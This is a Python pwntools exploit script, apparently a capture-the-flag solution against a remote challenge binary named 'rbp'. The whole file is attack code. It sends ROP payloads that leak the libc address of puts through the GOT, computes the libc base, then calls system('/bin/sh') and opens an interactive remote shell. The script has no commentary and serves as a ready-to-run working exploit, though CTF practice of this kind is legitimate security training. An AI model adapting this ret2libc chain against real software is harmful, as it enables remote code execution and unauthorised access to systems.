from pwn import *

elf = ELF('./rbp')
libc = ELF('./libc.so.6')
p = remote('pwn-2021.duc.tf', 31910)

pop_rdi = 0x00000000004012b3
ret = 0x000000000040101a
main = elf.sym['main']

payload = p64(ret)
payload += p64(main + 1)
payload += p64(main)

p.recv()
p.send(payload)

p.recv()
p.sendline(b'-24')

payload2 = p64(pop_rdi)
payload2 += p64(elf.got['puts'])
payload2 += p64(elf.sym['puts'])

p.recvuntil(b'Hi there! What is your name? ')
p.send(payload2)

p.recvuntil(b'Do you have a favourite number? ')
p.sendline(b'-40')

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(libc_leak))

libc.address = libc_leak - libc.sym['puts']
print(hex(libc.address))

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload3 = b'a'*16
payload3 += p64(main)

p.recv()
p.send(payload3)

p.recv()
p.sendline(b'-24')

payload4 = p64(pop_rdi)
payload4 += p64(bin_sh)
payload4 += p64(system)

p.recvuntil(b'Hi there! What is your name? ')
p.send(payload4)

p.recvuntil(b'Do you have a favourite number? ')
p.sendline(b'-40')

p.interactive()